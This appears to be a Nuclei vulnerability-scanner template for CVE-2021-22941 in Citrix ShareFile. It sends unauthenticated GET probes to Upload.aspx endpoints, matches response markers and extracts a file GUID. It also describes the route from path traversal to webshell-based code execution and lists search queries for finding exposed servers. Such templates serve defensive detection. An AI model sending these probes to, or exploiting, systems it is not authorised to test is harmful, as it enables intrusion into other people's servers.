id: CVE-2021-22941

info:
  name: Citrix ShareFile Storage Zones Controller < 5.11.20 - Broken Access Control
  author: GreenHacker420
  severity: critical
  description: |
    Citrix ShareFile Storage Zones Controller before 5.11.20 contains a broken access control vulnerability that allows unauthenticated attackers to access the Upload.aspx endpoint. Combined with path traversal in the uploadid parameter, attackers can write arbitrary files to the server, leading to remote code execution by overwriting ASP.NET Razor templates (.cshtml files).
  impact: |
    Successful exploitation allows unauthenticated remote code execution on the target server. Attackers can upload webshells, overwrite system files, and gain complete control of the affected system.
  remediation: |
    Upgrade to Citrix ShareFile Storage Zones Controller version 5.11.20 or later. Apply the security patch from Citrix advisory CTX328123.
  reference:
    - https://support.citrix.com/article/CTX328123
    - https://nvd.nist.gov/vuln/detail/CVE-2021-22941
    - https://codewhitesec.blogspot.com/2021/09/citrix-sharefile-rce-cve-2021-22941.html
    - https://www.crowdstrike.com/blog/prophet-spider-exploits-citrix-sharefile/
    - https://github.com/hoavt18/CVE-2021-22941
    - https://www.cisa.gov/news-events/alerts/2021/08/10/citrix-releases-security-update-sharefile-storage-zones-controller
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-22941
    cwe-id: CWE-306,CWE-22
    epss-score: 0.97565
    epss-percentile: 0.99951
    cpe: cpe:2.3:a:citrix:sharefile_storage_zones_controller:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 3
    vendor: citrix
    product: sharefile_storage_zones_controller
    shodan-query: http.title:"ShareFile"
    fofa-query: title="ShareFile"
    google-query: intitle:"ShareFile" "Storage"
  tags: cve,cve2021,citrix,sharefile,auth-bypass,broken-access-control,rce,kev,path-traversal

http:
  - raw:
      - |
        GET {{path}} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: en-US,en;q=0.5
        Connection: close

    payloads:
      path:
        - /ShareFile/StorageCenter/Upload.aspx?uploadid={{randstr}}&bp=1&multipart=false
        - /upload.aspx?uploadid={{randstr}}&bp=1&accountid=1&multipart=false
        - /StorageCenter/Upload.aspx?uploadid={{randstr}}&bp=1&multipart=false

    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: word
        name: localfile-check
        part: body
        words:
          - "LocalFile:"

      - type: word
        name: metadata-check
        part: body
        words:
          - "Chunk:"
          - "Finished:"
          - "UploadId:"
        condition: or

      - type: status
        name: success-status
        status:
          - 200

      - type: word
        name: server-headers
        part: header
        words:
          - "ASP.NET"
          - "IIS"
          - "text/plain"
        condition: or

    extractors:
      - type: regex
        name: localfile-guid
        group: 1
        regex:
          - 'LocalFile:\s*([a-fA-F0-9-]{36})'
        part: body
